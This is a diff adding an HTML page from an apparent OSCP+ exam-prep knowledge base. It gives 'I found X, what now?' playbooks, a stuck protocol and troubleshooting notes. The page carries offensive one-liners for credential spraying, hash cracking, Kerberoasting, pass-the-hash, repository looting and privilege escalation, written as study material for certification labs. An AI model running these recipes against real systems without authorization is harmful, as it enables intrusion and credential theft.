@@ -1,0 +1,757 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Reference &amp; Troubleshoot · OSCP+ KB</title>
+<style>
+:root{
+  --bg:#0d1117; --bg2:#0a0d12; --panel:#11161d; --panel2:#161c24; --hover:#1b2531;
+  --text:#c9d3de; --head:#e8eef5; --muted:#7d8794; --faint:#5a6472;
+  --accent:#4f9cf9; --accent-soft:#1a2942; --accent2:#e3a008;
+  --border:#20262e; --border2:#2a323c;
+  --code-bg:#0a0e13; --code-text:#c9d3de;
+  --tag-bg:#0f2a1c; --tag-text:#56d364; --tag-bd:#1c3f2a;
+  --hl:#7a5c00; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(0,0,0,.4);
+}
+html[data-theme="light"]{
+  --bg:#ffffff; --bg2:#f6f8fa; --panel:#f6f8fa; --panel2:#eef1f4; --hover:#e7ecf1;
+  --text:#24292f; --head:#0f1419; --muted:#57606a; --faint:#8b949e;
+  --accent:#0969da; --accent-soft:#ddf0ff; --accent2:#9a6700;
+  --border:#d8dee4; --border2:#cdd5dd;
+  --code-bg:#f2f4f7; --code-text:#24292f;
+  --tag-bg:#e6f7ec; --tag-text:#1a7f37; --tag-bd:#c3ead0;
+  --hl:#fff3b0; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(140,149,159,.25);
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--text);
+  font:15.5px/1.68 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  -webkit-font-smoothing:antialiased;}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+::selection{background:var(--accent-soft)}
+
+#layout{display:flex;min-height:100vh}
+
+/* ---------- Sidebar ---------- */
+#sidebar{width:300px;flex:0 0 300px;background:var(--panel);border-right:1px solid var(--border);
+  height:100vh;position:sticky;top:0;display:flex;flex-direction:column}
+#brand{padding:18px 18px 12px}
+#brand .logo{font-size:15px;font-weight:700;color:var(--head);letter-spacing:.2px;display:flex;align-items:center;gap:8px}
+#brand .tagline{color:var(--faint);font-size:11.5px;margin-top:3px;letter-spacing:.3px}
+#navfilterwrap{padding:0 14px 12px;border-bottom:1px solid var(--border)}
+#navfilter{width:100%;padding:9px 12px;background:var(--bg2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:13px;outline:none}
+#navfilter:focus{border-color:var(--accent)}
+#navtools{display:flex;gap:6px;padding:10px 14px 4px}
+#navtools button{flex:1;background:none;border:1px solid var(--border2);color:var(--muted);
+  border-radius:7px;padding:5px 6px;cursor:pointer;font-size:11px}
+#navtools button:hover{color:var(--text);border-color:var(--accent)}
+#nav{overflow-y:auto;padding:6px 8px 60px;flex:1}
+#nav::-webkit-scrollbar{width:9px}#nav::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+.navgroup{margin-bottom:1px}
+.navvol{width:100%;text-align:left;background:none;border:none;color:var(--head);
+  font-weight:600;font-size:12.5px;padding:8px 8px;cursor:pointer;border-radius:7px;
+  display:flex;gap:7px;align-items:center;line-height:1.35}
+.navvol:hover{background:var(--hover)}
+.navvol .tw{color:var(--faint);font-size:10px;transition:transform .15s;flex:0 0 10px}
+.navgroup.collapsed .tw{transform:rotate(-90deg)}
+.navgroup.collapsed .navitems{display:none}
+.navitems{display:flex;flex-direction:column;padding:1px 0 8px 3px;margin-left:8px;
+  border-left:1px solid var(--border)}
+.navlink{color:var(--muted);font-size:12px;padding:4px 10px;border-radius:6px;white-space:nowrap;
+  overflow:hidden;text-overflow:ellipsis;border-left:2px solid transparent;margin-left:-1px}
+.navlink:hover{background:var(--hover);color:var(--text);text-decoration:none}
+.navlink.lvl1{color:var(--head);font-weight:700;margin-top:11px;font-size:12.5px}
+.navlink.lvl1:first-child{margin-top:2px}
+.navlink.lvl2{padding-left:22px;font-size:11.5px;color:var(--muted);border-left:1px solid var(--border)}
+.navlink.lvl2:hover,.navlink.lvl2.active{border-left-color:var(--accent)}
+.navlink.active{background:var(--accent-soft);color:var(--accent);border-left-color:var(--accent)}
+
+/* ---------- Main ---------- */
+#main{flex:1;min-width:0;display:flex;flex-direction:column;background:var(--bg)}
+#topbar{position:sticky;top:0;z-index:20;background:color-mix(in srgb,var(--bg) 88%,transparent);
+  backdrop-filter:saturate(1.4) blur(8px);border-bottom:1px solid var(--border);
+  padding:11px 26px;display:flex;gap:12px;align-items:center}
+#searchwrap{position:relative;flex:1;max-width:620px}
+#searchwrap .ic{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--faint);font-size:14px}
+#search{width:100%;padding:9px 12px 9px 34px;background:var(--panel2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:14px;outline:none}
+#search:focus{border-color:var(--accent);background:var(--bg2)}
+#count{color:var(--muted);font-size:12px;min-width:64px;text-align:right;font-variant-numeric:tabular-nums}
+.iconbtn{background:var(--panel2);color:var(--muted);border:1px solid var(--border2);
+  border-radius:9px;width:38px;height:38px;cursor:pointer;font-size:15px;display:inline-flex;
+  align-items:center;justify-content:center}
+.iconbtn:hover{color:var(--text);border-color:var(--accent)}
+
+#content{padding:34px 44px 140px;max-width:860px;margin:0 auto;width:100%}
+#content h1{font-size:23px;font-weight:700;color:var(--head);letter-spacing:-.2px;
+  margin:8px 0 18px;padding-bottom:12px;border-bottom:1px solid var(--border);line-height:1.3}
+.vol + .vol h1, #content h1.volstart{margin-top:56px}
+.volkicker{font-size:10.5px;font-weight:700;letter-spacing:1.4px;color:var(--faint);text-transform:uppercase;
+  margin:58px 0 4px;padding-top:22px;border-top:1px solid var(--border)}
+.vol:first-child .volkicker{margin-top:4px;border-top:none;padding-top:0}
+#content h2{font-size:18px;font-weight:650;color:var(--head);margin:34px 0 10px;
+  padding-left:11px;border-left:3px solid var(--accent);line-height:1.35}
+#content h3{font-size:15px;font-weight:650;color:var(--accent2);margin:24px 0 8px}
+#content h4{font-size:13.5px;font-weight:650;color:var(--head);margin:16px 0 6px;
+  text-transform:uppercase;letter-spacing:.4px}
+.vol{scroll-margin-top:66px}
+#content h1,#content h2,#content h3,#content h4{scroll-margin-top:70px;position:relative}
+.anchor{opacity:0;margin-left:8px;color:var(--faint);font-weight:400;font-size:.75em}
+h1:hover .anchor,h2:hover .anchor,h3:hover .anchor{opacity:1}
+#content p{margin:9px 0}
+#content ul,#content ol{margin:9px 0;padding-left:24px}
+#content li{margin:4px 0}
+#content li::marker{color:var(--faint)}
+
+/* inline code + tag pills */
+code{background:var(--code-bg);color:var(--code-text);padding:1px 5px;border-radius:5px;
+  font:12.5px/1.45 "SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
+  border:1px solid var(--border);white-space:nowrap}
+code.tag{background:var(--tag-bg);color:var(--tag-text);border:1px solid var(--tag-bd);
+  font-weight:600;letter-spacing:.2px;cursor:pointer}
+code.tag:hover{filter:brightness(1.15)}
+
+pre{background:var(--code-bg);border:1px solid var(--border);border-radius:11px;padding:14px 16px;
+  overflow:auto;margin:14px 0;box-shadow:var(--shadow)}
+pre code{background:none;border:none;padding:0;color:var(--code-text);white-space:pre;
+  font-size:12.5px;line-height:1.55}
+pre::-webkit-scrollbar{height:9px}pre::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+
+blockquote{border-left:3px solid var(--accent2);background:var(--panel);margin:14px 0;
+  padding:11px 16px;border-radius:0 9px 9px 0;color:var(--muted);font-size:14.5px}
+blockquote strong{color:var(--head)}
+
+.tablewrap{overflow-x:auto;margin:14px 0;border:1px solid var(--border);border-radius:10px;box-shadow:var(--shadow)}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border-bottom:1px solid var(--border);border-right:1px solid var(--border);padding:8px 12px;text-align:left;vertical-align:top}
+tr td:last-child,tr th:last-child{border-right:none}
+tbody tr:last-child td{border-bottom:none}
+th{background:var(--panel2);font-weight:650;color:var(--head)}
+tbody tr:nth-child(even){background:var(--bg2)}
+tbody tr:hover{background:var(--hover)}
+
+hr{border:none;border-top:1px solid var(--border);margin:30px 0}
+mark{background:var(--hl);color:var(--head);padding:0 1px;border-radius:2px}
+mark.current{background:var(--hl-cur);color:#111;box-shadow:0 0 0 2px var(--hl-cur)}
+
+#totop{position:fixed;right:26px;bottom:26px;z-index:30;background:var(--accent);color:#fff;border:none;
+  width:42px;height:42px;border-radius:11px;font-size:17px;cursor:pointer;display:none;box-shadow:0 6px 18px rgba(0,0,0,.45)}
+#menuBtn{display:none}
+
+@media(max-width:900px){
+  #sidebar{position:fixed;z-index:50;left:-320px;transition:left .2s;box-shadow:6px 0 24px rgba(0,0,0,.5)}
+  #sidebar.open{left:0}
+  #menuBtn{display:inline-flex}
+  #content{padding:20px 18px 120px}
+  #topbar{padding:10px 14px}
+}
+</style>
+</head>
+<body>
+<div id="layout">
+  <aside id="sidebar">
+    <div id="brand">
+      <a href="index.html" style="text-decoration:none"><div class="logo">🧰 Reference &amp; Troubleshoot</div></a>
+      <a href="index.html" class="tagline" style="display:inline-block;margin-top:4px">← all sections</a>
+    </div>
+    <div id="navfilterwrap"><input id="navfilter" placeholder="Filter this section…"></div>
+    <nav id="nav"><div class="navitems"><a class="navlink lvl1" href="#v8-[found-]-i-found-x-what-now-do-this-first-then-if-fails-change-hypothesis">[FOUND-*]  &quot;I FOUND X, WHAT NOW?&quot;  (do-this-first → then → if-fails → change hypothesis)</a><a class="navlink lvl1" href="#v8-[stuck-protocol]-been-stuck-1530-min">[STUCK-PROTOCOL]  (been stuck 15–30 min)</a><a class="navlink lvl1" href="#v8-[common-rabbit-holes]-hub-per-area-traps-jump-to-yours">[COMMON-RABBIT-HOLES]  hub (per-area traps — jump to yours)</a><a class="navlink lvl1" href="#v8-[troubleshooting-quick]-[troubleshooting-db]-symptom-causes-checks-fix-if-still-broken">[TROUBLESHOOTING-QUICK] + [TROUBLESHOOTING-DB]  (SYMPTOM → CAUSES → CHECKS → FIX → IF STILL BROKEN)</a><a class="navlink lvl1" href="#v8-[chain-]-attack-chains-with-the-reasoning-between-stages">[CHAIN-*] ATTACK CHAINS (with the reasoning between stages)</a><a class="navlink lvl1" href="#v8-[tech-]-technology-encyclopedia">[TECH-*] TECHNOLOGY ENCYCLOPEDIA</a><a class="navlink lvl1" href="#v8-[tool-]-toolbox-purpose-quick-key-flags-output-mistakes-when-when-not">[TOOL-*] TOOLBOX  (PURPOSE / QUICK / KEY FLAGS / OUTPUT / MISTAKES / WHEN / WHEN NOT)</a><a class="navlink lvl1" href="#v8-[kali-toolbox]-every-exam-usable-kali-tool-by-phase-allowedbanned">[KALI-TOOLBOX]  🧰 every exam-usable Kali tool, by phase (+ allowed/banned)</a><a class="navlink lvl2" href="#v8--banned-avoid-using-these-can-void-points-[exam-rules-2026]">⛔ BANNED / avoid (using these can void points — [EXAM-RULES-2026])</a><a class="navlink lvl1" href="#v8-[flag-hunt]-find-the-flag-on-any-box-paste-and-go">[FLAG-HUNT]  🚩 find the flag on any box (paste-and-go)</a><a class="navlink lvl1" href="#v8-[machine-journal]-reusable-worksheet-copy-per-target">[MACHINE-JOURNAL] reusable worksheet (copy per target)</a><a class="navlink lvl1" href="#v8-final-deliverables">FINAL DELIVERABLES</a><a class="navlink lvl2" href="#v8-a-[master-index]-see-volume-0-full-tag-list-volume-map">A. [MASTER-INDEX] → see Volume 0 (full tag list + volume map).</a><a class="navlink lvl2" href="#v8-b-[top-100-things]-condensed-to-the-highest-value-50-principles-expand-via-tags">B. [TOP-100-THINGS] (condensed to the highest-value ~50 principles; expand via tags)</a><a class="navlink lvl2" href="#v8-c-[top-100-commands]-the-ones-you-actually-type">C. [TOP-100-COMMANDS] (the ones you actually type)</a><a class="navlink lvl2" href="#v8-d-[top-50-enum-checks]">D. [TOP-50-ENUM-CHECKS]</a><a class="navlink lvl2" href="#v8-e-[top-50-linux-privesc-checks]">E. [TOP-50-LINUX-PRIVESC-CHECKS]</a><a class="navlink lvl2" href="#v8-f-[top-50-windows-privesc-checks]">F. [TOP-50-WINDOWS-PRIVESC-CHECKS]</a><a class="navlink lvl2" href="#v8-g-[top-50-ad-checks]">G. [TOP-50-AD-CHECKS]</a><a class="navlink lvl2" href="#v8-h-[top-50-troubleshooting-checks]">H. [TOP-50-TROUBLESHOOTING-CHECKS]</a><a class="navlink lvl2" href="#v8-i-[top-50-found-scenarios]-all-covered-above-under-[found-]">I. [TOP-50-FOUND-SCENARIOS] → all covered above under [FOUND-*]</a><a class="navlink lvl2" href="#v8-j-[final-day-quick-reference]-print-this">J. [FINAL-DAY-QUICK-REFERENCE]  (print this)</a><a class="navlink lvl2" href="#v8-k-[minimum-viable-prep-plan]-volume-0-part-31-study-deep-ad-enum-privesc-web-core-pivoting-practice-4060-boxes-ad-weighted-skim-bofexotic">K. [MINIMUM-VIABLE-PREP-PLAN] → Volume 0 Part 31 (study deep: AD, enum, privesc, web core, pivoting; practice ~40–60 boxes AD-weighted; skim BOF/exotic).</a><a class="navlink lvl2" href="#v8-l-[7-day-plan]-volume-0-part-32">L. [7-DAY-PLAN] → Volume 0 Part 32.</a><a class="navlink lvl2" href="#v8-m-[current-offsec-rules]-volume-0-23h45m24h-10070-40-ad-320-no-bonus-msf-one-target-proof-flagwhoamiip-report-required-oscp-3-yr">M. [CURRENT-OFFSEC-RULES] → Volume 0 (23h45m+24h, 100/70, 40 AD + 3×20, no bonus, MSF one target, proof = flag+whoami+ip, report required, OSCP+ 3-yr).</a><a class="navlink lvl2" href="#v8-[resources]-external-tools-references-bookmark-and-cache-offline">[RESOURCES]  🔗 external tools &amp; references (bookmark — and cache OFFLINE)</a><a class="navlink lvl2" href="#v8-n-[sources]">N. [SOURCES]</a></div></nav>
+  </aside>
+  <div id="main">
+    <div id="topbar">
+      <button id="menuBtn" class="iconbtn" onclick="document.getElementById('sidebar').classList.toggle('open')">☰</button>
+      <a class="iconbtn" href="index.html" title="All sections">≡</a>
+      <div id="searchwrap"><span class="ic">🔎</span><input id="search" placeholder="Search this section…   Enter ↵ next"></div>
+      <span id="count"></span>
+      <button class="iconbtn" onclick="clearSearch()" title="Clear">✕</button>
+      <button class="iconbtn" onclick="toggleTheme()" title="Theme">◐</button>
+    </div>
+    <main id="content"><section class="vol"><div class="volkicker" id="v8-oscp-knowledge-base-volume-6">OSCP+ KNOWLEDGE BASE — VOLUME 6</div>
+<h2 id="v8-i-found-x-what-now-stuck-protocol-troubleshooting-attack-chains-tech-encyclopedia-toolbox-machine-journal-final-deliverables">&quot;I FOUND X, WHAT NOW?&quot; · STUCK PROTOCOL · TROUBLESHOOTING · ATTACK CHAINS · TECH ENCYCLOPEDIA · TOOLBOX · MACHINE JOURNAL · FINAL DELIVERABLES<a class="anchor" href="#v8-i-found-x-what-now-stuck-protocol-troubleshooting-attack-chains-tech-encyclopedia-toolbox-machine-journal-final-deliverables">#</a></h2>
+<hr>
+<h1 id="v8-[found-]-i-found-x-what-now-do-this-first-then-if-fails-change-hypothesis">[FOUND-*]  &quot;I FOUND X, WHAT NOW?&quot;  (do-this-first → then → if-fails → change hypothesis)<a class="anchor" href="#v8-[found-]-i-found-x-what-now-do-this-first-then-if-fails-change-hypothesis">#</a></h1>
+<h3 id="v8-[found-creds]-i-found-credentials">[FOUND-CREDS] I found credentials<a class="anchor" href="#v8-[found-creds]-i-found-credentials">#</a></h3>
+<ol>
+<li><strong>Spray everywhere:</strong> <code>nxc smb/winrm/ldap/mssql/rdp &lt;hosts&gt; -u U -p P</code> + <code>ssh</code>/<code>evil-winrm</code> + web logins. Try <code>--local-auth</code> and domain form.</li>
+<li>Try the same user with password <strong>variations</strong>; try the password with <strong>other users</strong>.</li>
+<li>If domain → <strong>BloodHound as this user</strong> + Kerberoast/AS-REP.</li>
+<li>IF FAILS: maybe it&#x27;s a hash not a password; maybe it unlocks a *file* (KeePass/zip) → crack. → change hypothesis: creds may be for a specific app, not the OS.</li>
+</ol>
+<h3 id="v8-[found-sshkey]-i-found-a-private-ssh-key">[FOUND-SSHKEY] I found a private SSH key<a class="anchor" href="#v8-[found-sshkey]-i-found-a-private-ssh-key">#</a></h3>
+<ol>
+<li><code>chmod 600 key; ssh -i key user@host</code> (guess user from filename/context/<code>authorized_keys</code>).</li>
+<li>Encrypted? <code>ssh2john key &gt; h; john --wordlist=rockyou.txt h</code>.</li>
+<li>Try the key against <strong>other</strong> hosts/users (reuse).</li>
+<li>IF FAILS: wrong user — check <code>/etc/passwd</code>, home dirs, <code>authorized_keys</code> comment field for the username.</li>
+</ol>
+<h3 id="v8-[found-suid]-i-found-an-unusual-suid-binary">[FOUND-SUID] I found an unusual SUID binary<a class="anchor" href="#v8-[found-suid]-i-found-an-unusual-suid-binary">#</a></h3>
+<ol>
+<li>GTFOBins the name (SUID section).</li>
+<li>Custom binary → <code>strings</code>/<code>ltrace ./bin</code> → relative-path call (PATH hijack) or command exec.</li>
+<li><code>pkexec</code> present → PwnKit.</li>
+<li>IF FAILS: it drops privs internally / no exploitable call → move to sudo/cron/caps.</li>
+</ol>
+<h3 id="v8-[found-sudo]-sudo--l-shows-something">[FOUND-SUDO] <code>sudo -l</code> shows something<a class="anchor" href="#v8-[found-sudo]-sudo--l-shows-something">#</a></h3>
+<ol>
+<li>GTFOBins the allowed binary (Sudo section).</li>
+<li>Editable script as root → inject payload. <code>env_keep LD_PRELOAD</code> → <code>.so</code> hijack.</li>
+<li>Version-specific: CVE-2021-3156 / CVE-2019-14287.</li>
+<li>IF FAILS: binary with no escape + no writable input → different vector.</li>
+</ol>
+<h3 id="v8-[found-smb]-i-found-smb">[FOUND-SMB] I found SMB<a class="anchor" href="#v8-[found-smb]-i-found-smb">#</a></h3>
+<ol>
+<li><code>nxc smb $IP -u &#x27;&#x27; -p &#x27;&#x27; --shares --users</code>; <code>smbclient -N -L //$IP/</code>; <code>enum4linux-ng -A $IP</code>.</li>
+<li>Read every readable share (GPP/<code>unattend.xml</code>/scripts/backups/<code>.kdbx</code>).</li>
+<li>Have creds → spray + <code>--rid-brute</code>; Pwn3d! → psexec/wmiexec.</li>
+<li>Domain name shown → pivot to <strong>AD</strong> (<code class="tag">[AD-QUICK]</code>). IF FAILS: null disabled → need creds first.</li>
+</ol>
+<h3 id="v8-[found-writable-service]-i-found-a-writable-service-unquoted-path-windows">[FOUND-WRITABLE-SERVICE] I found a writable service / unquoted path (Windows)<a class="anchor" href="#v8-[found-writable-service]-i-found-a-writable-service-unquoted-path-windows">#</a></h3>
+<ol>
+<li>Confirm write to binary/segment (<code>accesschk</code>/PowerUp).</li>
+<li>Replace/plant payload → <code>sc stop/start</code> (or wait for reboot/auto-restart).</li>
+<li>IF FAILS: can&#x27;t restart → find another service, or reboot-persistence, or different vector.</li>
+</ol>
+<h3 id="v8-[found-pw-config]-i-found-a-password-in-a-config-file">[FOUND-PW-CONFIG] I found a password in a config file<a class="anchor" href="#v8-[found-pw-config]-i-found-a-password-in-a-config-file">#</a></h3>
+<ol>
+<li>Identify what it&#x27;s for (DB? app? SSH? domain?). Try it on that service AND everywhere (reuse).</li>
+<li>DB cred → log into DB → dump app users/hashes → next creds.</li>
+<li>IF FAILS: could be old/rotated → try variations; look for more configs/backups.</li>
+</ol>
+<h3 id="v8-[found-git]-i-found-a-git-repo">[FOUND-GIT] I found a .git repo<a class="anchor" href="#v8-[found-git]-i-found-a-git-repo">#</a></h3>
+<ol>
+<li><code>git-dumper http://$IP/.git ./loot</code> (or already local: <code>cd repo</code>).</li>
+<li><code>git log -p | grep -iE &#x27;pass|secret|key|token&#x27;</code>; <code>git show &lt;deleted&gt;</code>; <code>git stash list</code>.</li>
+<li>Read source → find vulns/endpoints/creds.</li>
+<li>IF FAILS: check branches/tags, <code>.git/config</code> for remotes/creds.</li>
+</ol>
+<h3 id="v8-[found-backup]-i-found-a-backup-bakzipold">[FOUND-BACKUP] I found a backup (.bak/.zip/.old)<a class="anchor" href="#v8-[found-backup]-i-found-a-backup-bakzipold">#</a></h3>
+<ol>
+<li>Download + extract; encrypted zip → <code>zip2john</code>.</li>
+<li>Read for creds/source/DB dumps; source of a running app → find its vuln.</li>
+<li>IF FAILS: check for more backups; different extension guesses in dir brute.</li>
+</ol>
+<h3 id="v8-[found-sqli]-i-found-sql-injection">[FOUND-SQLI] I found SQL injection<a class="anchor" href="#v8-[found-sqli]-i-found-sql-injection">#</a></h3>
+<p>→ <code class="tag">[SQLI-DECISION-TREE]</code>: identify DB → union/blind → dump creds → (MSSQL <code>xp_cmdshell</code>/Postgres <code>COPY</code>/MySQL <code>FILE</code>) RCE. IF FAILS: dump creds and pivot to a login instead of chasing RCE.</p>
+<h3 id="v8-[found-lfi]-i-found-lfi">[FOUND-LFI] I found LFI<a class="anchor" href="#v8-[found-lfi]-i-found-lfi">#</a></h3>
+<p>→ <code class="tag">[WEB-LFI]</code>: <code>/etc/passwd</code> confirm → <code>php://filter</code> read source (creds) → log poisoning / wrapper RCE. IF FAILS: use it purely to read config/keys → SSH/login.</p>
+<h3 id="v8-[found-cmdinj]-i-found-command-injection">[FOUND-CMDINJ] I found command injection<a class="anchor" href="#v8-[found-cmdinj]-i-found-command-injection">#</a></h3>
+<p>→ <code class="tag">[WEB-CMDINJ]</code>: confirm with <code>;id</code>/<code>sleep</code>, then reverse shell (URL-encoded). IF FAILS: blind → exfil via HTTP/DNS; filtered → <code>${IFS}</code>/base64.</p>
+<h3 id="v8-[found-domainuser]-i-found-a-valid-domain-user">[FOUND-DOMAINUSER] I found a valid domain user<a class="anchor" href="#v8-[found-domainuser]-i-found-a-valid-domain-user">#</a></h3>
+<p>→ <code class="tag">[AD-QUICK]</code>/<code class="tag">[THINK-DOMAINUSER]</code>: BloodHound + Kerberoast + AS-REP + spray → follow shortest path.</p>
+<h3 id="v8-[found-spn]-i-found-an-spn-kerberoastable">[FOUND-SPN] I found an SPN (Kerberoastable)<a class="anchor" href="#v8-[found-spn]-i-found-an-spn-kerberoastable">#</a></h3>
+<p>→ <code class="tag">[AD-KERBEROAST]</code>: <code>GetUserSPNs -request</code> → hashcat 13100 → reuse pw + check that account&#x27;s rights.</p>
+<h3 id="v8-[found-asrep]-i-found-an-as-rep-roastable-user">[FOUND-ASREP] I found an AS-REP-roastable user<a class="anchor" href="#v8-[found-asrep]-i-found-an-as-rep-roastable-user">#</a></h3>
+<p>→ <code class="tag">[AD-ASREP]</code>: <code>GetNPUsers</code> → hashcat 18200 → reuse.</p>
+<h3 id="v8-[found-hash]-i-found-a-hash">[FOUND-HASH] I found a hash<a class="anchor" href="#v8-[found-hash]-i-found-a-hash">#</a></h3>
+<p>→ <code class="tag">[HASH-IDENTIFICATION]</code>: identify type. If NTLM → <strong>PtH first</strong> (<code>nxc -H</code>), then crack. Else pick the right hashcat mode.</p>
+<h3 id="v8-[found-linshell]-i-got-a-linux-shell">[FOUND-LINSHELL] I got a Linux shell<a class="anchor" href="#v8-[found-linshell]-i-got-a-linux-shell">#</a></h3>
+<ol>
+<li>Stabilize TTY. 2. <code>id; sudo -l; find / -perm -4000 2&gt;/dev/null</code>. 3. linpeas. 4. Loot creds + note internal subnets (pivot). → <code class="tag">[LINUX-PRIVESC-QUICK]</code>.</li>
+</ol>
+<h3 id="v8-[found-winshell]-i-got-a-windows-shell">[FOUND-WINSHELL] I got a Windows shell<a class="anchor" href="#v8-[found-winshell]-i-got-a-windows-shell">#</a></h3>
+<ol>
+<li><code>whoami /all</code>. 2. <code>whoami /priv</code> (SeImpersonate → Potato). 3. winpeas + service/registry checks. 4. Loot creds → lateral. → <code class="tag">[WINDOWS-PRIVESC-QUICK]</code>.</li>
+</ol>
+<h3 id="v8-[found-winrm]-i-found-winrm-5985">[FOUND-WINRM] I found WinRM (5985)<a class="anchor" href="#v8-[found-winrm]-i-found-winrm-5985">#</a></h3>
+<p>Have creds? <code>nxc winrm</code> → Pwn3d! → <code>evil-winrm -i $IP -u U -p P</code> (or <code>-H hash</code>). No creds → get them first (roast/spray/loot).</p>
+<h3 id="v8-[found-rdp]-i-found-rdp-3389">[FOUND-RDP] I found RDP (3389)<a class="anchor" href="#v8-[found-rdp]-i-found-rdp-3389">#</a></h3>
+<p>Validate <code>nxc rdp</code>; connect <code>xfreerdp /v:$IP /u:U /p:P +clipboard</code>. Use for GUI privesc/transfer. PtH needs Restricted Admin.</p>
+<h3 id="v8-[found-bh-genericall]-bloodhound-shows-i-have-genericall">[FOUND-BH-GENERICALL] BloodHound shows I have GenericAll<a class="anchor" href="#v8-[found-bh-genericall]-bloodhound-shows-i-have-genericall">#</a></h3>
+<p>→ <code class="tag">[AD-ACL]</code>: on user → force-change pw / shadow creds; on group → add self; on computer → RBCD/shadow; on domain → DCSync.</p>
+<h3 id="v8-[found-acl]-i-found-an-acl-edge">[FOUND-ACL] I found an ACL edge<a class="anchor" href="#v8-[found-acl]-i-found-an-acl-edge">#</a></h3>
+<p>→ <code class="tag">[AD-ACL]</code> table: map edge → recipe (WriteDACL→grant GenericAll; WriteOwner→own→DACL; AddKeyCredentialLink→shadow creds; etc.).</p>
+<h3 id="v8-[found-pivot]-i-found-a-pivot-host-dual-homed">[FOUND-PIVOT] I found a pivot host (dual-homed)<a class="anchor" href="#v8-[found-pivot]-i-found-a-pivot-host-dual-homed">#</a></h3>
+<p>→ <code class="tag">[PIVOT-QUICK]</code>: Ligolo/Chisel → route/proxychains → enumerate new subnet → spray creds there.</p>
+<hr>
+<h1 id="v8-[stuck-protocol]-been-stuck-1530-min">[STUCK-PROTOCOL]  (been stuck 15–30 min)<a class="anchor" href="#v8-[stuck-protocol]-been-stuck-1530-min">#</a></h1>
+<p><strong>Run this exact sequence — it prevents re-trying the same failed attack.</strong></p>
+<pre><code>1. STOP &amp; RE-READ your notes/scans. Answer: what have I NOT tried yet? (list untried surfaces)
+2. RE-ENUMERATE: full -p- TCP again + top UDP. New port? Re-run -sCV. (Services can start; you may have missed one.)
+3. RE-MAP WEB: every port, recursive dir brute + vhosts + params you skipped. Read source/JS again.
+4. CHECK ASSUMPTIONS: is the version/OS/DB what I think? Verify manually, not via one tool&#x27;s guess.
+5. CREDENTIALS: have I sprayed EVERY cred on EVERY service/user/host? Variations? Reuse?
+6. DIFFERENT PROTOCOL/SERVICE: attack a service I dismissed (SNMP/UDP/RPC/LDAP/NFS/redis).
+7. VERSION RESEARCH: searchsploit + web for exact versions I found; read the CVE technique, try manually.
+8. LOCAL (if I have a shell): re-run linpeas/winpeas, `sudo -l`, `whoami /priv`, loot again; new user = new surface.
+9. AD: re-check roasts, BloodHound &quot;from owned&quot;, un-sprayed hosts, ACL edges I skipped.
+10. PIVOT: did I verify the tunnel actually works? re-scan the internal subnet.
+11. REVERT the box (service may be crashed / prior-tester state).
+12. SWITCH TARGET: write exactly where I stopped, go work another machine, return with fresh eyes.</code></pre>
+<p><strong>Meta-checks:</strong> Am I retrying variants of one hypothesis (rabbit hole)? Am I editing an exploit I don&#x27;t understand? Did I skip enumeration to jump to exploitation? The answer is almost always <strong>something un-enumerated</strong>, not a harder exploit.</p>
+<h1 id="v8-[common-rabbit-holes]-hub-per-area-traps-jump-to-yours">[COMMON-RABBIT-HOLES]  hub (per-area traps — jump to yours)<a class="anchor" href="#v8-[common-rabbit-holes]-hub-per-area-traps-jump-to-yours">#</a></h1>
+<p>Each area has its own trap list; open the one for what you&#x27;re doing:</p>
+<ul>
+<li>Enumeration/nmap → search **<code>[COMMON-RABBIT-HOLES nmap]</code>** (Vol ④): <code>--script vuln</code> false positives, chasing &quot;filtered&quot; ports, full UDP <code>-p-</code>.</li>
+<li>Web → **<code>[COMMON-RABBIT-HOLES web]</code>** (Vol ⑤): endless dir-brute, XSS with no victim, deserialization/XXE without source.</li>
+<li>SQLi → uncrackable/over-fuzzed single param (see <code class="tag">[SQLI-TROUBLESHOOTING]</code>).</li>
+<li>Linux privesc → **<code>[COMMON-RABBIT-HOLES linux-privesc]</code>** (Vol ⑦): kernel exploits first, chasing every SUID, cracking a hash you don&#x27;t need.</li>
+<li>Windows privesc → **<code>[COMMON-RABBIT-HOLES windows-privesc]</code>** (Vol ⑦): jumping to kernel before <code>whoami /priv</code>, unquoted path with no writable segment.</li>
+<li>AD → **<code>[COMMON-RABBIT-HOLES ad]</code>** (Vol ⑧): grinding an uncrackable roast, ignoring BloodHound, forgetting to spray a new cred, exotic delegation when a simple ACL edge exists.</li>
+<li>Pivoting → **<code>[COMMON-RABBIT-HOLES pivot]</code>** (Vol ⑧): UDP/SYN over SOCKS, huge port ranges through a proxy, wrong tunnel direction.</li>
+</ul>
+<blockquote><strong>Universal tell:</strong> if it needs a 0-day or a miracle, you&#x27;re in a hole — the intended path is simpler and you missed enumeration (<code class="tag">[STUCK-PROTOCOL]</code>).</blockquote>
+<hr>
+<h1 id="v8-[troubleshooting-quick]-[troubleshooting-db]-symptom-causes-checks-fix-if-still-broken">[TROUBLESHOOTING-QUICK] + [TROUBLESHOOTING-DB]  (SYMPTOM → CAUSES → CHECKS → FIX → IF STILL BROKEN)<a class="anchor" href="#v8-[troubleshooting-quick]-[troubleshooting-db]-symptom-causes-checks-fix-if-still-broken">#</a></h1>
+<h3 id="v8-reverse-shell-doesnt-connect-full-version-[reverse-shell-not-connecting]">Reverse shell doesn&#x27;t connect  → full version <code class="tag">[REVERSE-SHELL-NOT-CONNECTING]</code><a class="anchor" href="#v8-reverse-shell-doesnt-connect-full-version-[reverse-shell-not-connecting]">#</a></h3>
+<p>CAUSES: wrong LHOST (used eth0 not tun0), listener down, egress blocked, encoding/quoting, AV.</p>
+<p>CHECKS: <code>ip a show tun0</code>; listener live; try ports 443/80/8080; <code>tcpdump -i tun0 port 443</code>.</p>
